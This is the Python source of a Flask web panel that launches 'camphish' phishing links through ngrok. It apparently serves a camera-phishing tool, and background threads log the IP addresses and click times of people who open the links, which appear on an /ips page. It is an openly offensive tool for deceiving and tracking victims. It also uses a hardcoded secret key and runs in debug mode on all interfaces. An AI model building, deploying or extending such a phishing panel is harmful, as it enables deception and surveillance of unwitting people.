#!/usr/bin/python
import platform
import time
import configparser
from functools import wraps

from flask import Flask, render_template, request, redirect, jsonify, url_for, flash, g
from flask_login import UserMixin, login_required, current_user, login_user, LoginManager, logout_user
from flask_sqlalchemy import SQLAlchemy
from flask_restful import Resource, Api, abort, reqparse
from datetime import datetime, timezone

from werkzeug.security import generate_password_hash, check_password_hash

import camphish
import threading
import json
import tool_installer
import requests
from secrets import compare_digest
import machine_stats

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'secret'

db = SQLAlchemy(app)

API = Api(app)

login_manager = LoginManager( )
login_manager.login_view = 'login'
login_manager.init_app(app)

times = list( )
# Set up Config Parser
config = configparser.ConfigParser( )
config.read('app.cfg')


class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True)
    password = db.Column(db.String(120))
    name = db.Column(db.String(120))


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated:
            return {'message': 'Token is missing'}, 401
        return f(*args, **kwargs)

    return decorated


class ownrecource(Resource):
    @token_required
    def get(self):
        return machine_stats.get_stats( )


API.add_resource(ownrecource, '/api/v1/get_stats')


@app.context_processor
def add_imports():
    return dict(platform=platform, requests=requests)


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


@app.route("/profile")
@login_required
def profile():
    return render_template("profile.html", user=current_user)


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        remember = True if request.form.get("remember") else False

        user = User.query.filter_by(email=email).first( )

        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect("/")
        else:
            flash("Invalid Email or Password")
            return redirect(url_for("login"))
    else:
        return render_template("login.html")


@app.route("/logout")
@login_required
def logout():
    flash("You have been logged out")
    logout_user( )
    return redirect("/")


@app.route("/register", methods=["GET", "POST"])
@login_required
def register():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        name = request.form.get("name")
        user = User.query.filter_by(email=email).first( )

        if user:
            flash("Email address already exists")
            return redirect(url_for("register"))

        new_user = User(email=email, password=generate_password_hash(password, method="sha256"), name=name)

        db.session.add(new_user)
        db.session.commit( )
        return redirect(url_for("login"))
    else:
        return render_template("register.html")


@app.route('/')
@login_required
def index():
    services = json.loads(open(config['PATHS']['ServicesPath'], "r").read( ))
    return render_template('index.html', services=services)


@app.route("/my_machine", methods=["GET", "POST"])
@login_required
def my_machine():
    if request.method == "POST":
        return machine_stats.get_stats( )
    else:
        return render_template("my_machine.html", user=current_user, machine_stats=machine_stats.get_stats( ))


@app.route('/camphish/', methods=['GET', 'POST'])
@login_required
def camphish_create() -> str:
    if request.method == 'GET':
        return render_template('Camphish.html', ngrok_url=None)
    else:
        template = request.form.get('template')
        auth = "test"
        # ngrok_url = camphish.camphish(int(service), int(template), autthoken=auth)
        global ngrok_url_thread
        ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(template), auth),
                                                  daemon=True)
        ngrok_url_thread.start( )

        print('FUNKTION GESTARTET')

        # print(service, template, ngrok_url)

        def check_connection():
            before_connections = list( )
            global times
            while True:
                if before_connections != camphish.output.connections:
                    before_connections = camphish.output.connections
                    print(f'{camphish.output.connections} | just clicked the Link.')
                    camphish.output.old_connections.append(camphish.output.connections[0])
                    times.append(datetime.now(timezone.utc))
                    camphish.output.connections.clear( )
                    time.sleep(2)
                else:
                    time.sleep(2)

        check_thread = threading.Thread(target=check_connection, daemon=True)
        check_thread.start( )
        while camphish.output.link is None:
            pass
        return render_template('Camphish.html', ngrok_url=camphish.output.link, ownSwitch=True)


@app.route('/ips', methods=['GET', 'POST'])
@login_required
def return_ips():
    if request.method == 'GET':
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)
    elif request.method == 'POST':
        return jsonify(camphish.output.old_connections)
    else:
        return render_template('ips.html', ips=camphish.output.old_connections, time=times)


@app.route('/stop_camphish', methods=['GET', 'POST'])
@login_required
def stop_camphish():
    ngrok_url_thread.stop( )
    return redirect('/CamPhish')


@app.route('/get_link', methods=['POST'])
@login_required
def process():
    # service = request.form['port_forwarding']
    service = request.form.get('service')
    # template = request.form['template']
    template = request.form.get('template')
    auth = 'AuthKey'

    global ngrok_url_thread

    ngrok_url_thread = camphish.custom_thread(target=camphish.camphish, args=(int(service), int(template), auth),
                                              daemon=True)
    ngrok_url_thread.start( )

    print('FUNKTION GESTARTET')

    def check_connection():
        before_connections = list( )
        global times
        while True:
            if before_connections != camphish.output.connections:
                before_connections = camphish.output.connections
                print(f'{camphish.output.connections} | just clicked the Link.')
                camphish.output.old_connections.append(camphish.output.connections[0])
                times.append(datetime.now(timezone.utc))
                camphish.output.connections.clear( )
                time.sleep(2)
            else:
                time.sleep(2)

    check_thread = threading.Thread(target=check_connection, daemon=True)
    check_thread.start( )
    while camphish.output.link is None:
        pass
    return camphish.output.link


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
